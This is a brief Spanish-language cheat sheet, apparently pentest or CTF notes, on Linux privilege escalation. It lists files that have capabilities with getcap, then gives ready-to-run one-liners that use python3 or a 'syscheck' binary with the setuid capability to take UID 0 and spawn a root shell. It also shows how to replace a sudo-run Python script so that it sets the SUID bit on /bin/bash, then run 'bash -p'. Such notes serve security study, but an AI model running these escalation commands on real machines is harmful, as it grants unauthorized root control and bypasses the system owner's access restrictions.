Comando para ver qué capacidades especiales tiene asignados un archivo ejecutable. Permiten a un porgrama realizar acciones privilegiadas sin necesidad de ser root. Por ejemplo: abrir puertos bajos, manipular la red, leer la hora del sistema, 

```bash
getcap -r / 2>/dev/null

/sbin/getcap -r / 2>/dev/null

```

## Explotación de binarios con capability

Syscheck
```bash
/usr/local/bin/syscheck -c "import os; os.setuid(0); os.system('/bin/bash')"
```
Python
```bash
RUTA_DE_GETCAP/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
## Aplicar permisos SUID con script

Si el usuario actual es dueño del script:

```bash
rm <RUTA_A_SCRIPT>
```

Una vez que lo hayamos eliminado, crearemos el script con el mismo nombre pero añadiendo lo siguiente:

```python
echo -e "import os\n\nos.system('chmod u+s /bin/bash')" > <RUTA_A_SCRIPT>
```

Ahora hacemos lo siguiente:

```bash
sudo /usr/bin/python3 <RUTA_A_SCRIPT>
```

```bash
bash -p
```
